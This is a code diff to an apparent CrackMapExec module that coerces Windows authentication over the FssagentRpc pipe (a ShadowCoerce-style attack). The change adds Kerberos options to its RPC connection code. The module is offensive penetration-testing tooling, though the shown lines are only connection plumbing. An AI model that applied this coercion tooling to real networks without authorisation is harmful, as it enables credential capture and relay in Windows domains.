@@ -9,7 +9,7 @@ from impacket.dcerpc.v5.ndr import NDRCALL
 from impacket.dcerpc.v5.dtypes import BOOL, LONG, WSTR, LPWSTR
 from impacket.uuid import uuidtup_to_bin
 from impacket.dcerpc.v5.rpcrt import DCERPCException
-from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE
 
 class CMEModule:
     
@@ -34,7 +34,7 @@ class CMEModule:
 
     def on_login(self, context, connection):
         c = CoerceAuth()
-        dce = c.connect(username=connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, target=connection.host, pipe="FssagentRpc")
+        dce = c.connect(username=connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, target=connection.host, pipe="FssagentRpc", doKerberos=connection.kerberos, dcHost=connection.kdcHost)
 
         # If pipe not available, try again. "TL;DR: run the command twice if it doesn't work." - @Shutdown
         if dce == 1:
@@ -127,7 +127,7 @@ OPNUMS = {
 }
 
 class CoerceAuth():
-    def connect(self, username, password, domain, lmhash, nthash, target, pipe):
+    def connect(self, username, password, domain, lmhash, nthash, target, pipe, doKerberos, dcHost):
         binding_params = {
             'FssagentRpc': {
                 'stringBinding': r'ncacn_np:%s[\PIPE\FssagentRpc]' % target,
@@ -143,6 +143,11 @@ class CoerceAuth():
         dce.set_credentials(*rpctransport.get_credentials())
         dce.set_auth_type(RPC_C_AUTHN_WINNT)
         dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+
+        if doKerberos:
+            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
+            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+
         logging.debug("Connecting to %s" % binding_params[pipe]['stringBinding'])
         
         try:
